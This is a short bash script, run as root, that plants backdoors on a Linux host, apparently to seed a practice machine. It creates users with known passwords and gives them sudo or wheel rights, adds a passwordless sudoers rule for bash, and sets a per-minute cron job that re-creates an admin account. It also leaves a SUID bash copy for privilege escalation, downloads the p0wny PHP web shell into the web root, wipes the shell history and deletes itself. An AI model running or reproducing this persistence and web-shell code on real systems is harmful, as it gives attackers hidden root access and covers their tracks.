#!/bin/bash
#Check for root privileges
if [[ $UID != 0 ]]; then
    echo "Please run this script with sudo:"
    echo "sudo $0 $*"
    exit 1
fi
#Add bad users
useradd -p $(openssl passwd -1 hack3r) hack3r
useradd -p $(openssl passwd -1 baddie) baddie
useradd -p $(openssl passwd -1 adm1n) adm1n
echo 'ALL ALL=NOPASSWD:/bin/bash' >> /etc/sudoers.d/README
usermod -aG sudo adm1n
usermod -aG wheel adm1n
usermod -aG sudo baddie
usermod -aG wheel hack3r
#write out current crontab
echo "useradd -p $(openssl passwd -1 adm1n) adm1n && usermod -aG sudo adm1n">/opt/1
chmod +x /opt/1
crontab -l > mycron
echo "* * * * * bash /opt/1" >> mycron
crontab mycron
rm mycron
#COPY bash shell
cp /bin/bash /usr/share/home
#ADD SUID bit for privesc
chmod u+s /usr/share/home
#Add Powny shell to webroot
$webroot=`grep -i 'DocumentRoot' /etc/apache2/sites-available/000-default.conf | sed 's/DocumentRoot //'`
curl -o $webroot/shell.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
if [[ `ps -acx|grep httpd|wc -l` > 0 ]]; then
    echo "VM Configured with Apache"
    service httpd restart
fi
if [[ `ps -acx|grep apache|wc -l` > 0 ]]; then
    echo "VM Configured with Apache"
    service apache2 restart
fi
if [[ `ps -acx|grep nginx|wc -l` > 0 ]]; then
    echo "VM Configured with Nginx"
    service nginx restart
fi
#Clear history
cat /dev/null > ~/.bash_history && history -c && history -w
#Delete self
rm -- "$0"
